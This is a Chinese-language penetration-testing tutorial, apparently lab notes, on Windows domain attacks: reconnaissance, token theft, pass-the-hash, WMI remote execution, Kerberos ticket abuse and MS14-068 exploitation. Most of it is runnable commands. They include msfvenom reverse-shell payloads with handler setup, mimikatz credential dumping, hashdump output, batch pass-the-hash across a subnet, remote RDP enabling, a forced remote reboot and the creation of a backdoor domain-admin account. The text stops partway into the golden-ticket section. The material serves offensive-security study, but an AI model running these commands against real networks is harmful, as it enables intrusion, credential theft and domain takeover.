#查询域管理用户，可以根据上一步查询的组结果查询组内成员\nnet group &quot;domain controllers&quot; &#x2F;domain #查询域控主机名称，可以根据结果ping获取域控IP\nnet config workstation #查看当前工作环境\nnltest &#x2F;dclist:moonsec #查询域控\nping 12server-dc.moonsec.fbi #用ping命令查询域控IP\nnslookup 12server-dc.moonsec.fbi #使用nslookup查询域控主机IP\n# 2、主机发现\n在域内进行横向渗透时，首先要收集主机的端口和 IP 信息。\n\n\nnet view /domain:moonsec 查询域内的主机信息\nnet view &#x2F;domain:moonsec #一般会出错，如果错误6118，要在域控内将Computer Browser服务启动\n\n\narp -a 查询通信\narp -a #显示当前主机的arp交换表（IP与MAC地址绑定表）\n\n\n使用 nbtscan 发现主机，项目地址：https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4\nnbtscan.exe -r 192.168.0.1&#x2F;24 #可以扫描整个C段的存活主机（不止局限于域内）\n\n\n\nbat 命令发现主机 —— 系统自带命令，不用软件\nfor &#x2F;l %i in (1,1,255) do @ping 10.189.0.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot; #修改所在IP段，也是不局限于域内的主机\n\n\n\n基于 MSF 的内网主机探测\n\n使用 msf 进行反弹 shell，获取内网主机后，通过 msf 自带的扫描模块进行 IP 扫描\n\n主机存活探测：\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #ARP扫描\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #UDP扫描\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #NETBIOS扫描\nauxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum #SNMP扫描\nauxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #SMB扫描\n\n端口扫描：\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack TCP #ACK端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce #FTP bounce端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn #SYN 端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #TCP端口扫描，使用较多\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas #TCP XMas端口扫描\n\n\nnmap 扫描\n-sT: TCP 扫描\n-sS: SYN 扫描\n-sA: ACK 扫描\n-sF：FIN 扫描\n-sU: UDP 扫描\n-sR: RPC 扫描\n-sP: ICMP 扫描\n\nnmap -sS -p 1-65535 -v 192.168.99.177 #扫描示例，使用SYN扫描指定IP的所有端口\n\n\n# 3、常见端口及服务\n\n\n\n# 4、域渗透思路\n​\t\t通过域成员主机，定位出域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。\n# 5、内网渗透 Token\n令牌 (token) 是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌在系统重新启动前将持续存在于系统中。 令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。\n假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需 要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。\n令牌的分类：\n\n访问令牌 (Access Token)：表示访问控制操作主体的系统对象\n会话令牌 (Session Token)：是交互会话中唯一的身份标识符\n密保令牌 (Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾\n\nwindows 环境下的令牌分为两种：\n\nDelegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)\nimpersonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)\n\n注： 两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后， 该 Token 将变成 Impersonation token，依旧有效。\n# 5.1 Access Token 的窃取与利用\nAccess Token 的窃取与利用需要 administrator 管理员权限。也就是说要提权。\n窃取 Access Token 的方法：\nincognito.exe 程序 、InvokeTokenManipulat.ps1 脚本 、MSF 里的 incognito 模块\n# 1.incognito.exe\n下载地址：https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip\n注：不做免杀会被直接毙\n\n列出本地 Access Token (需要 administrator 权限)\n\nincognito.exe list_tokens -u\n\n\n使用 Access Token 模拟其他用户\n\nincognito.exe execute -c &quot;完整的 Token 名&quot; cmd.exe\nincognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exe\nincognito.exe execute -c &quot;MOONSEC\\12SERVER&quot; cmd.exe\n\n\n# 2…MSF 下的 incognito 模块\n\n生成 msf 后门并连接\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.0.115 -f exe -o msf.exe\nmsfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lhost 192.168.0.115\nset lport 6666\nexploit\n\n使用 incognito 并列举出 token 并窃取令牌\n\nmeterpreter > use incognito\nmeterpreter > list_tokens -u #列出令牌\nmeterpreter > impersonate_token \"NT AUTHORITY\\SYSTEM\" #窃取令牌\n\n\n从进程窃取令牌:steal_token PID 命令\n\nmeterpreter > ps #列出进程\nmeterpreter > steal_token 2544\n\n# 3.Invoke-TokenManipulation.ps1 脚本\n下载地址：https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1\n这个脚本是 PowerSploit 下 Exfiltration 文件夹内的一个脚本\n列举token:\nInvoke-TokenManipulation -Enumerate\n提权至system:\nInvoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authoritysystem\"\n复制(窃取)进程token:\nInvoke-TokenManipulation -CreateProcess \"cmd.exe\" -ProcessId 500\n复制(窃取)线程token:\nInvoke-TokenManipulation -CreateProcess \"cmd.exe\" -ThreadId 500\n注：但是复现失败\n# 横向渗透\n# 1、PTH (Pass The Hash) 传递\n\nPTH：Pass The Hash，在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接 通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码\npass the hash 原理：\n\n在 Windows 系统中，通常会使用 NTLM 身份认证\nNTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成 (例如 LsaLogonUser)\nhash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash\n如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户（即跳过调用 API 生成 hash 的过程）\n\n\nPTH 攻击适用于：\n\n域 / 工作组环境\n可以获得 hash，但是条件不允许对 hash 进行爆破\n内网中存在和当前机器相同的密码\n\n\n微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程 IPC 连接\n如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功\n从 windows 到 windows 横向 pth 这一类攻击方法比较广泛\n\n# 1.1 mimikatz pth\nprivilege::debug #启动后进行调试\nsekurlsa::logonpasswords #获取当前主机存在的hash\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"> password.txt #将获取的信息导出到一个文件中，便于复制\n\n\n获取 hash 之后进行下一步的攻击，如切换权限等\n\nprivilege::debug #调试\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:32ed87bdb5fdc5e9cba88547376818d4 #使用hash连接，可在域内使用其他主机连接本主机\ndir \\\\192.168.52.141\\c$ #执行成功说  ####实验失败\n\n# 1.2 psexec\n\n\npsexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。\n\n\n利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。 对方开放 445 端口，就相当于开放了 smb 协议\n\n\n由于会建立和删除服务，会在系统日志中产生记录，容易被溯源\n\n\n工具位于 PSTools 下\n\n\npsexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递\n\n\n明文密码传递：\n\n\nPsExec64.exe &#x2F;accepteula &#x2F;s \\\\192.168.0.123 -u Administrator -p 123456 cmd\n#-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框\n#-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell\nPsExec.exe &#x2F;accepteula &#x2F;s \\\\192.168.0.141 -u Administrator -p 123456 cmd &#x2F;c &quot;ipconfig&quot;\n#直接直接执行回显 -u 域\\用户名 -p 密码\n\n\nhash 密文传递：impacket 下的 psexec.py 工具\n\npsexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 .&#x2F;Administrator@192.168.0.123\n#hash前面的随便填，后面的一段是NTML\npython3 psexec.py moonsec&#x2F;Administrator@192.168.0.142 #直接登录，执行后输入密码\npsexec &#x2F;accepteula &#x2F;s \\\\12server1 -u Administrator -p 123456 cmd #登录主机其他用户\n\n\n使用 psexec 注意事项\n\n需要远程系统开启 admin$ 共享（默认是开启的）\n因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口\n在使用 IPC$ 连接目标系统后，不需要输入账户和密码\n在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务， 命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。\n使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell\n在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能， 只能依靠账号和密码进行传递\n\n\n\n# 1.3 msf 的 psexec 模块\n\n生成后门并建立连接\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.254.130 -f exe -o msf.exe\nmsfconsole\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set lhost 192.168.254.130\nmsf6 exploit(multi/handler) > set lport 6666\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > exploit\n\n导出 hash 值，此动作需要 administrator 用户才可完成\n\nmeterpreter > hashdump \n12server1:1001:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nadmin:1002:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\n放到后台，使用相关模块\n\nmeterpreter > background\nmsf6 exploit(multi/handler) > search psexec\nmsf6 exploit(multi/handler) > use exploit/windows/smb/psexec\nmsf6 exploit(windows/smb/psexec) > set SMBUSER Administrator\nmsf6 exploit(windows/smb/psexec) > set rhosts 192.168.254.144 #可以设置ip为192.168.0.1/24进行批量pth\nmsf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387\nmsf6 exploit(windows/smb/psexec) > exploit\n\n注：关闭防火墙后测试成功，未关闭防火墙提示超时无法连接。这里是使用本地 hash 之后提权到本地 system，下图为使用同一 hash 碰撞域控服务器\n\n# 1.4 CrackMapExec C 段批量 pth\n\nkali 自带工具，项目地址：https://github.com/byt3bl33d3r/CrackMapExec.git，kali 安装直接用  sudo apt install crackmapexec\n\ncrackmapexec smb 192.168.254.0/24 -u administrator -H 42e2656ec24331269f82160ff5962387 #对C段进行PTH，-H跟NTML\n\n# 1.5 WMI\n\nWMI 全称 Windows Management Instrumentation 即 Windows 管理工具， Windows 98 以后的操作系统都支持 WMI\n由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些\n\n# wmic 命令 —— 使用明文\n\nWMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目 标主机 C 盘的 ip.txt 文件中\n使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口 ( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤ 445 端⼝传回显）\n\nwmic &#x2F;node:192.168.254.144 &#x2F;user:administrator &#x2F;password:QWEasd123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\\ip.txt&quot;\n#node：IP，user：用户名 password：密码\n\n建立 IPC$，读取回显结果\n\nnet use \\\\192.168.254.144\\ipc$ &quot;QWEasd123&quot; &#x2F;user:administrator #建立IPc\ntype \\\\192.168.254.144\\c$\\ip.txt #读取文件内容\n\n# wmiexec.py\n\nImpacket 工具包下的 wmiexec.py 脚本，可以用来直接获取 shell\n其他攻击手法可以看下 Readme，这里只对简单的 pth 做一下实验\n\npython wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144\npython wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144 \"whoami\"\n#不加执行语句可直接获取cmd，加执行语句可返回执行结果\n#第一串字符可以随意写\n\n\n# wmiexec.vbs\n\nwmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs\n获取 shell\n\ncscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.254.144 administrator QWEasd123\n\n\n执行单条命令\n\ncscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.254.144 administrator QWEasd123 &quot;ipconfig&quot;\n\n# Invoke-WmiCommand\n\nInvoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。\n需要以管理员身份运行 powershell\n\n# 导入 Invoke-WmiCommand.ps1 脚本\nImport-Module .\\Invoke-WmiCommand.ps1\n\n# 指定目标系统用户名\n$User = \".\\administrator\"\n\n# 指定目标系统的密码\n$Password = ConvertTo-SecureString -String \"QWEasd123\" -AsPlainText -Force\n\n# 将账号和密码整合起来，以便导入 Credential\n$Cred = New-Object -TypeName System.Management.Automation.PSCredential-ArgumentList $User,$Password\n\n# 指定要执行的命令和目标 IP，ipconfig处替换为要执行的命令，ip替换为目标IP\n$Remote = Invoke-WmiCommand -Payload &#123;hostname&#125; -Credential $Cred -ComputerName 192.168.254.145\n\n# 将执行结果输出到屏幕上\n$Remote.PayloadOutput\n\n# Invoke-WMIMethod\n\nInvoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序，无需下载脚本\n看不到回显。。。\n\n# 指定目标系统用户名\n$User=\".\\administrator\"\n\n# 指定目标系统密码\n$Password=ConvertTo-SecureString -String \"QWEasd123\" -AsPlainText -Force\n\n# 将账号和密码整合起来，以便导入 Credential 中\n$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password\n\n# 在远程系统中运行hostname命令\nInvoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList \"calc.exe\" -ComputerName \"192.168.254.145\" -Credential $Cred\n\n# wmic 的其他命令\n\n使用 wmic 远程开启目标的 RDP\n\n# 适于 Windows xp、server 2003\nwmic /node:192.168.7.7 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!=\"\") CALL SetAllowTSConnections 1\n\n# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname\nwmic /node:192.168.254.144 /user:administrator /password:QWEasd123 RDTOGGLEWHERE ServerName='12server1' call SetAllowTSConnections 1\n#或者\nwmic /node:192.168.254.144 /user:administrator /password:QWEasd123 process call create 'cmd.exe /c REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'\n\n#判断是否开启RDP,0x0开启，0x1关闭\nREG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n#远程重启电脑\nwmic /node:192.168.254.144 /user:administrator /password:QWEasd123 process call create \"shutdown.exe -r -f -t 0\"\n\n\n# 2、PTT (Pass The Ticket) 票据传递攻击\n# 2.1 Kerberos 协议\n\n\n\n\nKerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥) 执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。\n\n\n为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色：\n\n\n\n\n\n角色\n作用\n\n\n\n\nDomain Controller\n域控制器，简称 DC，一台计算机，实现用户、计算机的统一管理\n\n\nKey Distribution Center\n秘钥分发中心，简称 KDC，默认安装在域控里，包括 AS 和 TGS\n\n\nAuthentication Service\n身份验证服务，简称 AS，用于 KDC 对 Client 认证\n\n\nTicket Granting Service\n票据授予服务，简称 TGS，用于 KDC 向 Client 和 Server 分发 Session Key（临时秘钥）\n\n\nActive Director\n活动目录，简称 AD，用于存储用 户、用户组、域相关的信息\n\n\nClient\n客户端：指用户\n\n\nServer\n服务端：可能是某台计算机，也可能是某个服务\n\n\n\n\n打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是 whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami\n但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心\n\n# 2.2 Kerberos 认证原理\n\n整个认证过程如下：\n\n首先 Client 向域控制器 DC 请求访问 Server，DC 通过去 AD 活动目录中查找依次区分 Client 来判断 Client 是否可信\n认证通过后返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）\nClient 继续拿着 TGT 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT， 判断 Client 是否有访问权限\n如果有，则给 Client 有访问 Server 的权限 Ticket，也叫 ST（Service Ticket）\nClient 得到 Ticket 后，再去访问 Server，且该 Ticket 只针对这一个 Server 有效\n最终 Server 和 Client 建立通信\n\n详细认证步骤分为以下三个阶段\n\nAS_REQ &amp; AS_REP\nTGS_REQ &amp; TGS_REP\nAP_REQ &amp; AP_REP\n\n# AS_REQ &amp; AS_REP\n该阶段是 Client 和 AS 的认证，通过认证的客户端将获得 TGT 认购权证\n\n\n当域内某个客户端用户 Client 试图访问域内的某个服务，于是输入用户名和密码，此时客户端本机的 Kerberos 服务会向 KDC 的 AS 认证服务发送一个 AS_REQ 认证请求。请求的凭据是 Client 的哈希值 NTLM-Hash 加密的时间戳以及 Clientinfo、Server-info 等数据，以及一些其他信息\n当 Client 发送身份信息给 AS 后，AS 会先向活动目录 AD 请求，询问是否有此 Client 用户，如果有的话，就会取出它的 NTLM-Hash，并对 AS_REQ 请求中加密的时间戳进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。然后 AS 会生成一个临时秘钥 Session-Key AS，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此 Session-key AS 用于确保客户端和 KGS 之间的通信安全\n还有一部分响应内容内容是 TGT：使用 KDC 一个特定账户的 NTLM-Hash 对 Session-key AS、时间戳、Client-info 进行的加密。这个特定账户就是创建域控时自动生成的 Krbtgt 用户，然后将这两部分以及 PAC 等信息回复给 Client，即 AS_REP。PAC 中包含的是用户的 SID、用户所在的组等一些信息\nAS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化\n至此，Kerberos 认证的第一步完成\n\n# TGS_REQ &amp; TGS_REP\n该阶段是 Client 和 TGS 的认证，通过认证的客户端将获得 ST 服务票据\n\n\n客户端 Client 收到 AS 的回复 AS_REP 后分别获得了 TGT 和加密的 Session-Key AS。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key AS，然后会在本地缓存此 TGT 和原始的 Session-Key AS，如果现在它就需要访问某台服务器上的服务，他就需要凭借这张 TGT 认购凭证向 KGS 购买相应的 ST 服务票据（也叫 Ticket）\n此时 Client 会使用 Session-Key AS 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 TGT 作为另一部分继续发送给 TGS。两部分组成的请求被称为 TGS_REQ。\nTGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key AS、 时间戳、Client-info 以及 Server-info。再用 Session-key AS 解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，如果时间戳跟当前时间相差太久，就需要重新认证。TGS 还会将这个 Client 的信息与 TGT 中的 Client 信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server， 如果都没有问题，认证成功。认证成功后，KGS 会生成一个 Session-key TGS，并用 Session-key AS 加密 Session-key TGS 作为响应的一部分。此 Session-key TGS 用于确保客户端和服务器之间的通信安全\n另一部分是使用服务器 Server 的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据生成的 ST。然后 TGS 将这两部分信息回复给 Client，即 TGS_REP\n至此，Client 和 KDC 的通信就结束了，然后是和 Server 进行通信\n\n# AP_REQ &amp; AP_REP\n该阶段是 Client 和 TGS 的认证，通过认证的客户端将与服务器建立连接。\n\n\n客户端 Client 收到 TGS_REP 后，分别获得了 ST 和加密的 Session-Key TGS。它会 先使用本地缓存了的 Session-key AS 解密出了原始的 Session-key TGS。然后它会在本地缓存此 ST 和原始的 Session-Key TGS，当客户端需要访问某台服务器上的服务时会向服务器发送请求。它会使用 Session-key TGS 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server，这个请求即是 AP_REQ。\nServer 收到 AP_REQ 请求后，用自身的 Server NTLM-Hash 解密了 ST，得到 Session-Key TGS，再解密出 Client-info、时间戳等数据。然后与 ST 的 Clientinfo、时间戳等进行一一对比。时间戳有效时间一般时间为 8 小时。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信 息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 AP-REP 并与 Client 建立通信\n至此，Kerberos 认证流程基本结束\n\n# 2.3 PAC\n\n我们在前面关于 Kerberos 认证流程的介绍中提到了 PAC（Privilege Attribute Certificate）这个东西，这是微软为了访问控制而引进的一个扩展，即特权访问证书\n在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证 正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解 决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题\n为了解决上面的这个问题，微软引进了 PAC。即 KDC 向客户端 Client 返回 AS_REP 时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的 AP_REQ 请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限， DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。\n但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC， PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提\n\n# 2.4 Kerberos 认证中的相关安全问题概述\nKerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的 MS14-068、黄金票据、白银票据等就是基于 Kerberos 协议进行攻击 的。下面我们便来大致介绍一下 Kerberos 认证中的相关安全问题\n# 黄金票据（Golden ticket）\n\n\n在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。那么如果获取到了 Krbtgt 的 NTLM-Hash 值，不就可以伪造任意的 TGT 了吗。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门\n\n\n先假设这么一种情况，原先已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账 户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务\n\n\n# 白银票据（Silver ticket）\n\n白银票据不同于黄金票据，白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造 TGT 的 20 分钟内，TGS 不会对该 TGT 的真伪进行效验。 白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 Krbtgt 账号的密码哈希值，因此更加隐蔽\n\n# MS14-068\n\n这里便用到了我们之前所讲到的 PAC 这个东西，PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。但也恰恰是这个 PAC 造成了 MS14-068 这个漏洞\n该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限\n\n# 密码喷洒攻击（Password Spraying）\n\n在实际渗透中，许多渗透测试人员和攻击者通常都会使用一种被称为 “密码喷洒” （Password Spraying）的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名\n\n# AS-REP Roasting\n\n我们前文说过，AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破\n而如果域用户设置了选项 “Do not require Kerberos preauthentication”（该选项默认没有开启）关闭了预身份验证的话，攻击者可以使用指定的用户去请求票据，向域控制器发送 AS_REQ 请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码，这种攻击方式被称作 AS-REP\n\n# 2.5 票据传递攻击\n# MS14-068\n\n受影响版本：Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2\n该漏洞可导致活动目录整体权限控制收到影响，允许攻击者将域内任意用户权限提升至域管理级别。\n信息收集：\n\nsysteminfo | find \"3011780\" #如果返回为空则未打补丁\nsysteminfo #查看域名称\nnltest/dsgetdc:域名 #查看域控的主机名\nnet config workstation #收集域名和其他信息\n\ndir \\\\WIN-9ESHUR52A3G.moonsec.fbi\\c$ #正常情况下无法访问\n\n使用 MS14-068 伪造票据\n\nwhoami /all #查看当前用户的SID S-1-5-21-3501430782-1563410060-2157377696-1108\nms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址\nms14-068.exe -u 12server1@moonsec.fbi -p 123456 -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d WIN-9ESHUR52A3G.moonsec.fbi\n\n执行后会在当前目录下生成一个 TGT 文件\n\n\n\n使用 mimikatz 清空当前内存中的票据，并把这个 TGT 文件导入\n\nkerberos::purge #清除当前内存的票据\nkerberos::ptc \"票据文件\" #导入票据文件\n\n\n\n此时我们可以向域中添加域管理员账号密码\n\nnet user moonsec123 Qwe123... &#x2F;add &#x2F;domain\nnet group &quot;Domain Admins&quot; moonsec123 &#x2F;add &#x2F;domain\n\n\n# 黄金票据\n\n黄金票据使用的前提是我们已经通过 MS14-068 或者其他方法获取域控权限\n伪造黄金票据的所需条件\n\n域名称\n域的 SID 